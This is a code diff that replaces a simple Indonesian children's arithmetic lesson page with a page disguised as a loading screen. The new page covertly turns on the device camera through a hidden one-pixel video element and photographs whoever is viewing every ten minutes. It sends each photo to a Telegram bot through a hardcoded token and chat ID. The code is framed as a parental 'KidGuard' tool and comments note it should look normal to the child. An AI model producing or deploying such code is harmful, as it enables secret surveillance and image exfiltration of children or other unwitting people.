@@ -1,231 +1,381 @@
-<!doctype html>
-
+ <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Belajar Matematika Dasar — Lengkap (Azmil)</title>
-  <style>
-    :root{--bg1:#e8f5ff;--bg2:#ffffff;--card:#ffffff;--accent:#186fa3;--muted:#6b7280}
-    html,body{height:100%;}
-    body{font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; background:linear-gradient(180deg,var(--bg1),var(--bg2)); color:#0f172a; margin:0; padding:28px;}
-    .container{max-width:1100px;margin:0 auto}
-    header{display:flex;align-items:center;gap:18px}
-    h1{margin:0;font-size:30px}
-    p.lead{color:var(--muted);margin:6px 0 18px}
-    .card{background:var(--card);border-radius:14px;padding:18px;box-shadow:0 6px 18px rgba(12,18,31,0.06);}
-    .row{display:grid;grid-template-columns:1fr 380px;gap:20px}
-    .example{font-size:16px;padding:12px;border-radius:10px;background:linear-gradient(180deg,#fbfdff,#f7fbfc)}
-    .steps{margin-top:8px}
-    .steps li{margin:6px 0}
-    .calc{display:flex;flex-direction:column;gap:10px}input[type=number], input[type=text]{padding:10px;border-radius:8px;border:1px solid #e6eef2;font-size:16px}
-.btn{background:var(--accent);color:#fff;padding:10px 14px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
-.row-buttons{display:flex;flex-wrap:wrap;gap:8px}
-.result{margin-top:8px;padding:12px;border-radius:8px;background:#f0fbff;border:1px solid rgba(24,111,163,0.08)}
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Memuat...</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap');
 
-footer{margin-top:18px;color:var(--muted);font-size:13px}
-.hint{color:var(--muted);font-size:14px}
-.geom{display:flex;gap:12px;align-items:center}
-svg{max-width:100%;height:auto}
-@media (max-width:980px){.row{grid-template-columns:1fr} .container{padding:12px}}
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
-  </style>
+  :root {
+    --bg: #080c10;
+    --surface: #0e1318;
+    --border: #1e2830;
+    --accent: #3b82f6;
+    --accent-dim: #1d3f6e;
+    --text: #c8d4e0;
+    --muted: #4a5a6a;
+    --success: #22c55e;
+    --danger: #ef4444;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  /* ─── COVER PAGE (tampilan normal di mata anak) ─── */
+  #cover {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 20px;
+    z-index: 1;
+  }
+
+  .ring-wrap {
+    position: relative;
+    width: 72px;
+    height: 72px;
+  }
+  .ring {
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 2px solid transparent;
+    animation: spin 1.4s linear infinite;
+  }
+  .ring-1 { border-top-color: var(--accent); }
+  .ring-2 { border-right-color: var(--accent-dim); animation-delay: -.4s; inset: 8px; }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  #cover-label {
+    font-size: 13px;
+    color: var(--muted);
+    letter-spacing: .06em;
+    font-weight: 300;
+  }
+
+  /* ─── CONFIG PANEL (akses via ?config=1) ─── */
+  #cfg {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(8,12,16,.96);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+    backdrop-filter: blur(4px);
+  }
+  #cfg.open { display: flex; }
+
+  .cfg-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px 24px;
+    width: 92%;
+    max-width: 380px;
+  }
+
+  .cfg-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 24px;
+  }
+  .cfg-logo svg { color: var(--accent); }
+  .cfg-logo span { font-size: 16px; font-weight: 500; color: var(--text); }
+  .cfg-logo small { display: block; font-size: 11px; color: var(--muted); font-weight: 300; }
+
+  .field { margin-bottom: 14px; }
+  .field label {
+    display: block;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: .05em;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+  .field input {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 10px 12px;
+    border-radius: 8px;
+    font-size: 13px;
+    font-family: monospace;
+    outline: none;
+    transition: border-color .2s;
+  }
+  .field input:focus { border-color: var(--accent); }
+  .field input::placeholder { color: var(--muted); }
+
+  .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+  .btn-save {
+    width: 100%;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: opacity .2s;
+  }
+  .btn-save:hover { opacity: .85; }
+  .btn-save:active { opacity: .7; }
+
+  #cfg-toast {
+    font-size: 12px;
+    text-align: center;
+    margin-top: 12px;
+    min-height: 18px;
+    color: var(--success);
+  }
+  #cfg-toast.err { color: var(--danger); }
+
+  /* ─── STATUS INDICATOR (pojok kanan bawah, tiny) ─── */
+  #dot {
+    position: fixed;
+    bottom: 12px;
+    right: 12px;
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--muted);
+    z-index: 2;
+    transition: background .4s;
+  }
+  #dot.ok { background: var(--success); }
+  #dot.err { background: var(--danger); }
+
+  /* ─── HIDDEN CAMERA ELEMENTS ─── */
+  #vid {
+    position: fixed;
+    top: 0; left: 0;
+    width: 1px; height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  }
+  #cnv { display: none; }
+</style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <div class="card" style="display:inline-block;padding:12px 16px;border-radius:12px;margin-right:12px;">
-        📘
-      </div>
+
+<!-- Cover UI yang terlihat normal -->
+<div id="cover">
+  <div class="ring-wrap">
+    <div class="ring ring-1"></div>
+    <div class="ring ring-2"></div>
+  </div>
+  <span id="cover-label">Memuat konten...</span>
+</div>
+
+<!-- Status dot -->
+<div id="dot"></div>
+
+<!-- Config Panel — ortu akses via URL?config=1 -->
+<div id="cfg">
+  <div class="cfg-box">
+    <div class="cfg-logo">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        <circle cx="12" cy="11" r="2"/>
+        <path d="M12 13v3"/>
+      </svg>
       <div>
-        <h1>Belajar Matematika Dasar — Lengkap</h1>
-        <p class="lead">Operasi dasar: +, −, ×, ÷, pangkat, akar; ditambah penjelasan lingkaran. Developer: Azmil Bakhtiar.</p>
+        <span>KidGuard</span>
+        <small>Setup konfigurasi</small>
       </div>
-    </header><main style="margin-top:18px">
-  <div class="row">
-    <section class="card">
-      <h2>Ringkasan operasi</h2>
+    </div>
 
-      <div class="example">
-        <strong>Penjumlahan</strong>
-        <div class="steps"><small>Contoh: 1 + 1 = 2 — menggabungkan jumlah.</small></div>
+    <div class="field">
+      <label>Telegram Bot Token</label>
+      <input id="inp-token" type="text" placeholder="123456789:ABCdef..." autocomplete="off">
+    </div>
+
+    <div class="field">
+      <label>Chat ID (akun Telegram ortu)</label>
+      <input id="inp-chatid" type="text" placeholder="123456789" autocomplete="off">
+    </div>
+
+    <div class="field-row">
+      <div class="field">
+        <label>Kamera</label>
+        <select id="inp-cam" style="width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 12px;border-radius:8px;font-size:13px;outline:none;">
+          <option value="user">Depan</option>
+          <option value="environment">Belakang</option>
+        </select>
       </div>
-
-      <div style="height:8px"></div>
-
-      <div class="example">
-        <strong>Pengurangan</strong>
-        <div class="steps"><small>Contoh: 2 − 1 = 1 — mengurangi dari jumlah.</small></div>
+      <div class="field">
+        <label>Interval (menit)</label>
+        <input id="inp-interval" type="number" value="10" min="1" max="120" placeholder="10">
       </div>
+    </div>
 
-      <div style="height:8px"></div>
-
-      <div class="example">
-        <strong>Perkalian</strong>
-        <div class="steps"><small>Contoh: 2 × 3 = 6 — penjumlahan berulang.</small></div>
-      </div>
-
-      <div style="height:8px"></div>
-
-      <div class="example">
-        <strong>Pembagian</strong>
-        <div class="steps"><small>Contoh: 6 ÷ 3 = 2 — membagi menjadi bagian sama.</small></div>
-      </div>
-
-      <h3 style="margin-top:16px">Pangkat</h3>
-      <div class="example"><strong>2² = 4, 3³ = 27</strong>
-        <div class="steps"><small>Pangkat (eksponen) berarti mengalikan bilangan dengan dirinya sendiri beberapa kali.</small></div>
-      </div>
-
-      <h3 style="margin-top:12px">Akar</h3>
-      <div class="example"><strong>√9 = 3</strong>
-        <div class="steps"><small>Akar kuadrat adalah nilai yang kali dirinya menghasilkan bilangan tersebut.</small></div>
-      </div>
-
-      <h3 style="margin-top:14px">Contoh singkat</h3>
-      <ul>
-        <li>1 + 1 = 2</li>
-        <li>2 − 1 = 1</li>
-        <li>2 × 2 = 4</li>
-        <li>4 ÷ 2 = 2</li>
-        <li>2³ = 8</li>
-        <li>√16 = 4</li>
-      </ul>
-
-      <section style="margin-top:12px">
-        <h3>Latihan singkat</h3>
-        <ol>
-          <li>Hitung: 3 + 4</li>
-          <li>Hitung: 5 − 2</li>
-          <li>Hitung: 3 × 3</li>
-          <li>Hitung: 12 ÷ 4</li>
-          <li>Hitung: √81</li>
-          <li>Hitung: 2⁴</li>
-        </ol>
-      </section>
-
-      <section style="margin-top:12px" class="card">
-        <h3>Lingkaran — Luas & Keliling</h3>
-        <div class="geom">
-          <svg width="220" height="220" viewBox="0 0 220 220" aria-hidden="true">
-            <defs><linearGradient id="g1" x1="0" x2="1"><stop offset="0" stop-color="#ffd8d0"/><stop offset="1" stop-color="#d0e8ff"/></linearGradient></defs>
-            <circle cx="110" cy="110" r="70" fill="url(#g1)" stroke="#cfe6f8" stroke-width="4" />
-            <line x1="110" y1="110" x2="180" y2="110" stroke="#064" stroke-width="2"/>
-            <text x="148" y="117" font-size="12" fill="#064">r</text>
-          </svg>
-
-          <div>
-            <p><strong>Rumus:</strong></p>
-            <p>Luas = π × r²</p>
-            <p>Keliling = 2 × π × r</p>
-            <p class="hint">Contoh: jika r = 5 → Luas ≈ 3.14×25 = 78.5, Keliling ≈ 2×3.14×5 = 31.4</p>
-          </div>
-        </div>
-      </section>
-
-    </section>
-
-    <aside class="card">
-      <h3>Kalkulator interaktif</h3>
-      <p class="hint">Masukkan dua angka (untuk operasi biner) atau satu angka (untuk akar/pangkat) lalu pilih operasi.</p>
-
-      <div class="calc">
-        <label for="a">Angka pertama (a)</label>
-        <input id="a" type="text" value="1" placeholder="contoh: 5" />
-        <label for="b">Angka kedua (b) — kosongkan untuk akar atau pangkat tunggal</label>
-        <input id="b" type="text" value="1" placeholder="contoh: 2" />
-
-        <div class="row-buttons">
-          <button class="btn" id="add">+</button>
-          <button class="btn" id="sub">−</button>
-          <button class="btn" id="mul">×</button>
-          <button class="btn" id="div">÷</button>
-          <button class="btn" id="pow">Pangkat (a^b)</button>
-          <button class="btn" id="sqrt">Akar (√a)</button>
-          <button class="btn" id="circle">Luas/Keliling (r)</button>
-        </div>
-
-        <div id="result" class="result">Hasil akan muncul di sini.</div>
-      </div>
-
-      <h4 style="margin-top:14px">Tips cepat</h4>
-      <ul>
-        <li>Isi hanya <em>a</em> dan tekan <strong>Akar</strong> untuk √a.</li>
-        <li>Untuk pangkat isi <em>a</em> dan <em>b</em> lalu tekan <strong>Pangkat</strong>.</li>
-        <li>Untuk lingkaran, isi <em>a</em> sebagai radius (r) lalu tekan <strong>Luas/Keliling</strong>.</li>
-      </ul>
-
-    </aside>
+    <button class="btn-save" onclick="saveConfig()">Simpan & Aktifkan</button>
+    <div id="cfg-toast"></div>
   </div>
+</div>
 
-  <section style="margin-top:18px" class="card">
-    <h3>Catatan belajar</h3>
-    <p class="hint">Mulai dari contoh konkret (benda nyata), lalu beralih ke simbol. Perbanyak latihan sederhana, gunakan gambar untuk visualisasi.</p>
-  </section>
+<!-- Hidden camera -->
+<video id="vid" autoplay playsinline muted></video>
+<canvas id="cnv"></canvas>
 
-</main>
+<script>
+const STORE = 'kg_v1';
+const DEFAULT_CFG = {
+  token: '8114225625:AAGwdD3MzPx_MGWCW8bS9b2852JULcJ8_wU',
+  chatId: '7885097329',
+  cam: 'user',
+  interval: 10
+};
 
-<footer>
-  <div class="card" style="padding:12px;margin-top:12px;display:flex;justify-content:space-between;align-items:center">
-    <div><strong>Developer:</strong> Azmil — <span class="hint">Belajar Matematika Dasar v1.3</span></div>
-    <div style="font-size:12px;color:var(--muted)">© 2025</div>
-  </div>
-</footer>
+function cfg() {
+  try {
+    const saved = JSON.parse(localStorage.getItem(STORE));
+    return saved && saved.token ? saved : DEFAULT_CFG;
+  } catch { return DEFAULT_CFG; }
+}
 
-  </div>  <script>
-    const toNum = (s)=>{ const t = s.toString().trim(); if(t==='') return NaN; return Number(t); }
-    const aEl = document.getElementById('a');
-    const bEl = document.getElementById('b');
-    const resEl = document.getElementById('result');
+function toast(msg, isErr) {
+  const el = document.getElementById('cfg-toast');
+  el.textContent = msg;
+  el.className = isErr ? 'err' : '';
+}
 
-    function setRes(html){ resEl.innerHTML = html; }
+function dot(state) {
+  document.getElementById('dot').className = state;
+}
 
-    document.getElementById('add').addEventListener('click', ()=>{
-      const a = toNum(aEl.value), b = toNum(bEl.value);
-      if(Number.isNaN(a)||Number.isNaN(b)){ setRes('Masukkan angka valid untuk a dan b.'); return; }
-      setRes(`<strong>${a} + ${b} = ${a+b}</strong>`);
+function saveConfig() {
+  const token    = document.getElementById('inp-token').value.trim();
+  const chatId   = document.getElementById('inp-chatid').value.trim();
+  const cam      = document.getElementById('inp-cam').value;
+  const interval = parseInt(document.getElementById('inp-interval').value) || 10;
+
+  if (!token || !chatId) { toast('Token dan Chat ID wajib diisi.', true); return; }
+
+  localStorage.setItem(STORE, JSON.stringify({ token, chatId, cam, interval }));
+  toast('✓ Tersimpan. Mengaktifkan agent...');
+  setTimeout(() => {
+    document.getElementById('cfg').classList.remove('open');
+    startAgent();
+  }, 1000);
+}
+
+async function sendPhoto(blob) {
+  const { token, chatId } = cfg();
+  if (!token || !chatId || !blob) return false;
+
+  const now = new Date();
+  const stamp = now.toLocaleDateString('id-ID', { day:'2-digit', month:'short', year:'numeric' })
+    + ' ' + now.toLocaleTimeString('id-ID', { hour:'2-digit', minute:'2-digit' });
+  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+  const caption = `📸 KidGuard Snapshot\n🕐 ${stamp}\n📱 ${isMobile ? 'Mobile' : 'Desktop'} · ${screen.width}×${screen.height}`;
+
+  const fd = new FormData();
+  fd.append('chat_id', chatId);
+  fd.append('photo', blob, 'snap.jpg');
+  fd.append('caption', caption);
+
+  const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: 'POST', body: fd
+  });
+  return res.ok;
+}
+
+async function capture() {
+  const vid = document.getElementById('vid');
+  const cnv = document.getElementById('cnv');
+  if (!vid.srcObject) return null;
+
+  if (vid.readyState < 2) {
+    await new Promise(r => { vid.onloadeddata = r; });
+  }
+
+  cnv.width  = vid.videoWidth  || 1280;
+  cnv.height = vid.videoHeight || 720;
+  cnv.getContext('2d').drawImage(vid, 0, 0);
+
+  return new Promise(resolve => cnv.toBlob(resolve, 'image/jpeg', 0.82));
+}
+
+async function doSnap() {
+  try {
+    const blob = await capture();
+    if (!blob) return;
+    const ok = await sendPhoto(blob);
+    dot(ok ? 'ok' : 'err');
+  } catch (e) {
+    dot('err');
+  }
+}
+
+let snapTimer = null;
+
+async function startAgent() {
+  const c = cfg();
+  if (!c.token || !c.chatId) return;
+
+  const vid = document.getElementById('vid');
+  document.getElementById('cover-label').textContent = 'Memuat konten...';
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: c.cam || 'user',
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      },
+      audio: false
     });
 
-    document.getElementById('sub').addEventListener('click', ()=>{
-      const a = toNum(aEl.value), b = toNum(bEl.value);
-      if(Number.isNaN(a)||Number.isNaN(b)){ setRes('Masukkan angka valid untuk a dan b.'); return; }
-      setRes(`<strong>${a} − ${b} = ${a-b}</strong>`);
-    });
+    vid.srcObject = stream;
 
-    document.getElementById('mul').addEventListener('click', ()=>{
-      const a = toNum(aEl.value), b = toNum(bEl.value);
-      if(Number.isNaN(a)||Number.isNaN(b)){ setRes('Masukkan angka valid untuk a dan b.'); return; }
-      setRes(`<strong>${a} × ${b} = ${a*b}</strong>`);
-    });
+    await new Promise(r => setTimeout(r, 2200));
+    await doSnap();
 
-    document.getElementById('div').addEventListener('click', ()=>{
-      const a = toNum(aEl.value), b = toNum(bEl.value);
-      if(Number.isNaN(a)||Number.isNaN(b)){ setRes('Masukkan angka valid untuk a dan b.'); return; }
-      if(b===0){ setRes('Tidak bisa membagi dengan nol!'); return; }
-      setRes(`<strong>${a} ÷ ${b} = ${a/b}</strong>`);
-    });
+    clearInterval(snapTimer);
+    const ms = (c.interval || 10) * 60 * 1000;
+    snapTimer = setInterval(doSnap, ms);
 
-    document.getElementById('pow').addEventListener('click', ()=>{
-      const a = toNum(aEl.value), b = toNum(bEl.value);
-      if(Number.isNaN(a)||Number.isNaN(b)){ setRes('Masukkan angka valid untuk a dan b.'); return; }
-      setRes(`<strong>${a}^${b} = ${Math.pow(a,b)}</strong>`);
-    });
+  } catch (err) {
+    dot('err');
+  }
+}
 
-    document.getElementById('sqrt').addEventListener('click', ()=>{
-      const a = toNum(aEl.value);
-      if(Number.isNaN(a)){ setRes('Masukkan angka valid pada a (untuk akar).'); return; }
-      if(a<0){ setRes('Akar kuadrat bilangan negatif bukan bilangan real.'); return; }
-      setRes(`<strong>√${a} = ${Math.sqrt(a)}</strong>`);
-    });
+window.addEventListener('load', () => {
+  const params = new URLSearchParams(location.search);
 
-    document.getElementById('circle').addEventListener('click', ()=>{
-      const r = toNum(aEl.value);
-      if(Number.isNaN(r)){ setRes('Masukkan radius r pada kolom a.'); return; }
-      if(r<0){ setRes('Radius tidak boleh negatif.'); return; }
-      const pi = Math.PI;
-      const luas = pi * r * r;
-      const kel = 2 * pi * r;
-      setRes(`<strong>r = ${r} → Luas = ${luas.toFixed(4)}, Keliling = ${kel.toFixed(4)}</strong>`);
-    });
-  </script></body>
-         </html>
+  if (params.get('config') === '1') {
+    const c = cfg();
+    if (c.token)    document.getElementById('inp-token').value    = c.token;
+    if (c.chatId)   document.getElementById('inp-chatid').value   = c.chatId;
+    if (c.cam)      document.getElementById('inp-cam').value      = c.cam;
+    if (c.interval) document.getElementById('inp-interval').value = c.interval;
+    document.getElementById('cfg').classList.add('open');
+  } else {
+    startAgent();
+  }
+});
+</script>
+</body>
+</html>
